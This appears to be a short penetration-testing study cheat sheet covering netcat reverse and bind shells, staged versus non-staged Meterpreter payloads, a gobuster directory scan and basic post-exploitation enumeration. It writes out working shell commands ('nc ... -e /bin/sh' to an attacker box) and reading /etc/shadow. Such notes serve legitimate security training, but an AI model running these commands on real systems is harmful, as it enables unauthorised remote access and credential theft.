# SHell Basics

Netcat Reverse SHell 


Attack Box                                                          Target

nc -lvp 4444              <<< TCP port 444             nc 192.168.1.1 4444 -e /bin/sh
listening                                                               connecting


Victim connects to us. What you will use most times.


Netcat Bind SHell 


Attack Box                                                                 Target

nc 192.168.1.2 444             TCP port 444>>>>          nc -lvp 4444 -e /bin/sh
connecting                                                                  listening

Staged vs Non Staged Payloads

Non Staged
    sends texploit shellcode all at once
    Larger in size and won't always work
    ex: 
    windows/meterpreter_reverse_tcp
    
Staged
    Sends payload in stages
    can be less stable
    ex:
    windows/meterpreter/reverse_tcp


# Gobuster
sudo gobuster dir -u http://192.168.52.129 -f  -e -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > gobusterScan

-f adds a slash at the end (helped when kioptrix was redirecting)
-e prints full url



#Post Exploitation
find current user
    whoami
    sudo -l

Network info
    ip
    arp table
    routes
    
check sys files
    cat /etc/passwd
    cat /etc/shadow
